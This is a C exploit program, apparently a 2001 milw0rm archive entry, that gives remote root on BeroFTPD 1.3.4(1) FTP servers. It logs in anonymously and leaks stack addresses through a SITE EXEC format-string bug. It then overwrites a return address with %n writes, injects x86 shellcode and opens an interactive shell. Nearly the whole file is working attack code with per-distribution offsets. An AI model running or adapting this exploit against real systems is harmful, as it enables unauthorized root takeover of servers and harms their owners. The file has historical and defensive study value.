/*  
 *  BeroFTPD 1.3.4(1) Linux x86 remote root exploit 
 *  by qitest1 - 5/05/2001
 *
 *  BeroFTPD is an ftpd derived from wuftpd sources. This code
 *  exploits the format bug of the site exec cmd, well known to be
 *  present in wuftpd-2.6.0 and derived daemons. BeroFTPD 1.3.4(1) 
 *  is the current version at the moment.    
 *  
 *  JUST SAMPLE CODE. For different platforms you have to try with
 *  different offsets for different retaddrs. You see.. =)   
 *
 *  Greets: Nail, Norby, Berserker.
 *  69 rulez.. ;P
 */

#include <stdio.h> 
#include <stdlib.h> 
#include <getopt.h>
#include <errno.h> 
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>

struct targ
{
   int			def;
   char 		*descr;
   unsigned long int 	enbuf;
   int			dawlen;
};

struct targ target[]=
    {			
      {0, "RedHat 6.2 with BeroFTPD 1.3.4(1) from tar.gz", 0xded, 6},
      {1, "Slackware 7.0 with BeroFTPD 1.3.4(1) from tar.gz", 0x1170, 12}, 
      {2, "Mandrake 7.1 with BeroFTPD 1.3.4(1) from rpm", 0xdf1, 6}, 
      {69, NULL, 0, 0}
    };

  /* 15 byte x86/linux PIC read() shellcode by lorian / teso
   */
unsigned char shellcode_read[] =
        "\x33\xdb"              /* xorl %ebx, %ebx      */
        "\xf7\xe3"              /* mull %ebx            */
        "\xb0\x03"              /* movb $3, %al         */
        "\x8b\xcc"              /* movl %esp, %ecx      */
        "\x68\xb2\x00\xcd\x80"  /* push 0x80CDxxB2      */
        "\xff\xff\xe4";         /* jmp  %esp            */

unsigned char shellcode[] =	/* Lam3rZ code */
        "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
        "\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
        "\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
        "\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
        "\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
        "\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
        "\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
        "\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
        "\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
        "\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
        "\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
        "\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
        "\x2e\x2e\x31\x31";

char 		  	fmtstr[1024];
int			sock;
int			sel;
int			offset;
unsigned long int       retloc;
unsigned long int 	bufaddr;
unsigned long int	tmpaddr;
	
void 		fmtstr_build(unsigned long int bufaddr, unsigned long int retloc);
void 		xpad_cat (unsigned char *fabuf, unsigned long int addr);
void 		retloc_find(void);
void 		shellami(int sock);
void		login(void);
void		usage(char *progname);
int 		conn2host(char *host, int port);

main(int argc, char *argv[])
{
char		rbuf[1024];
char		*host = NULL;
int 		cnt;

  printf("\n  BeroFTPD 1.3.4(1) exploit by qitest1\n\n");
  if(argc == 1)
	usage(argv[0]);
  while((cnt = getopt(argc,argv,"h:t:o:")) != EOF)
    {
   switch(cnt)
        {
   case 'h':
      host = strdup(optarg);
      break;
   case 't':
     sel = atoi(optarg);       
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   default:
     usage(argv[0]);
     break;
        }
    }

  if(host == NULL)
	usage(argv[0]);

  printf("+Host: %s\n  as: %s\n", host, target[sel].descr);

  printf("+Connecting to %s...\n", host);
  sock = conn2host(host, 21);
  printf("  connected\n");

  printf("+Receiving banner...\n");
  recv(sock, rbuf, 1024, 0);
  printf("%s", rbuf);
  memset(rbuf, 0, 1024);
  printf("  received\n");

  printf("+Logging in...\n");
  login();
  printf("  logged in\n");

  printf("+Searching retloc...\n");
  retloc_find();
  printf("  found: %p\n", retloc);

  printf("+Searching bufaddr...\n");
  bufaddr = tmpaddr + target[sel].enbuf;
  printf("  found: %p + offset = ", bufaddr);
  bufaddr += offset;
  printf("%p\n", bufaddr);  

  printf("+Preparing shellcode...\n");
  shellcode_read[strlen(shellcode_read)] = (unsigned char) strlen(shellcode);
  printf("  shellcode ready\n");

  printf("+Building fmtstr...\n");
  fmtstr_build(bufaddr, retloc);
  printf("  fmtstr builded\n");  
  
  printf("+Sending fmtstr...\n");
  send(sock, fmtstr, strlen(fmtstr), 0);
  printf("  fmtstr sent\n");
  recv(sock, rbuf, 1024, 0);
  sleep(1);
  send(sock, shellcode, strlen(shellcode), 0);
  sleep(2);
  printf("+Entering love mode...\n");  /* Nail teachs.. ;-) */
  shellami(sock);  

}

void
fmtstr_build(unsigned long int bufaddr, unsigned long int retloc)
{
int               i;
int		  eat = 136;
int               wlen = 428;
int               tow;
int               freespz;
char		  f[1024];
unsigned long int soul69 = 0x69696969;  /* That's amore.. =) */
unsigned char     retaddr[4];

  for(i = 0; i < 4; ++i)
	retaddr[i] = (bufaddr >> (i << 3)) & 0xff;

  wlen -= target[sel].dawlen;
  f[0] = 0;
  for(i = 0; i < eat; i++)
        strcat(f, "%.f");

  strcat(fmtstr, "SITE EXEC ");
  strcat(fmtstr, "  ");
  xpad_cat(fmtstr, retloc);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 1);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 2);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 3);
  strcat(fmtstr, f);
  strcat(fmtstr, "%x");

  /* Code by teso
   */
  tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;     
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;
  /* End here
   */

  freespz = 510 - strlen(fmtstr) - strlen(shellcode_read) - 1;
  for(i = 0; i < freespz ; i++)
	strcat(fmtstr, "\x90");
  strcat(fmtstr, shellcode_read);

  strcat(fmtstr, "\n");

}

  /* Code by teso
   */
void xpad_cat (unsigned char *fabuf, unsigned long int addr)
{
        int             i;
        unsigned char   c;

        for (i = 0 ; i <= 3 ; ++i) {
                switch (i) {
                case (0):
                        c = (unsigned char) ((addr & 0x000000ff)      );
                        break;
                case (1):
                        c = (unsigned char) ((addr & 0x0000ff00) >>  8);
                        break;
                case (2):
                        c = (unsigned char) ((addr & 0x00ff0000) >> 16);
                        break;
                case (3):
                        c = (unsigned char) ((addr & 0xff000000) >> 24);
                        break;
                }
                if (c == 0xff)
                        sprintf (fabuf + strlen (fabuf), "%c", c);

                sprintf (fabuf + strlen (fabuf), "%c", c);
        }

        return;
}
  /* End here
   */

void
retloc_find(void)
{
int		i;
char		rbuf[1024];
char		sbuf[1024];
char		*ptr;

  strcpy(sbuf, "SITE EXEC ");
  for(i = 0; i < 6; i++)
	strcat(sbuf, "%p ");
  strcat(sbuf, "\n");
  send(sock, sbuf, strlen(sbuf), 0); 

  recv(sock, rbuf, 1024, 0);
  ptr = rbuf;
  for(i = 0; i < 5; i++)
	{
	  while(*ptr != ' ')
	  	ptr++;
	  ptr++;
	}
  ptr[strlen(ptr) - 2] = '\x00';	
  ptr[strlen(ptr) - 1] = '\x00';
  sscanf(ptr, "%p", &retloc);
  sscanf(ptr, "%p", &tmpaddr);
  retloc -= 0x40;

}

void
shellami(int sock)
{
int 		n;
char 		recvbuf[1024];
char		*cmd = "id; uname -a\n";
fd_set 		rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock,&rset);
      FD_SET(STDIN_FILENO,&rset);
      select(sock+1,&rset,NULL,NULL,NULL);
      if (FD_ISSET(sock,&rset))
        {
          n=read(sock,recvbuf,1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n]=0;
          printf("%s",recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO,&rset))
        {
          n=read(STDIN_FILENO,recvbuf,1024);
          if (n>0)
            {
              recvbuf[n]=0;
              write(sock,recvbuf,n);
            }
        }
    }
  return;
}

int
conn2host(char *host, int port)
{
int 		sockfd;  
struct 		hostent *he;
struct 		sockaddr_in their_addr; 

  if ((he=gethostbyname(host)) == NULL)
	{ 
          herror("gethostbyname");
          exit(1);
	}
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
          perror("socket");
          exit(1);
	}

  their_addr.sin_family = AF_INET;     
  their_addr.sin_port = htons(port);   
  their_addr.sin_addr = *((struct in_addr *)he->h_addr);
  bzero(&(their_addr.sin_zero), 8);     

  if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
	{
          perror("connect");
          exit(1);
	}
 
  return(sockfd);

}

void
login(void)
{
char		*user = "USER anonymous\n";
char		*pass = "PASS guest@\n";
char		rbuf[1024];

  send(sock, user, strlen(user), 0);
  recv(sock, rbuf, 1024, 0);
  memset(rbuf, 0, 1024);
  send(sock, pass, strlen(pass), 0);
  while(strstr(rbuf, "login ok") == NULL)
	{
	  memset(rbuf, 0, 1024);
	  recv(sock, rbuf, 1024, 0);
	}

}

void
usage(char *progname)
{
int		i = 0;
  
  printf("Usage: %s [options]\n", progname);
  printf("Options:\n"
	 "  -h hostname\n"
	 "  -t target\n"
	 "  -o offset\n"
	 "Available targets:\n");
  while(target[i].def != 69)
	{ 
          printf("  %d) %s\n", target[i].def, target[i].descr);
          i++;
	} 

  exit(1);

}


// milw0rm.com [2001-05-08]
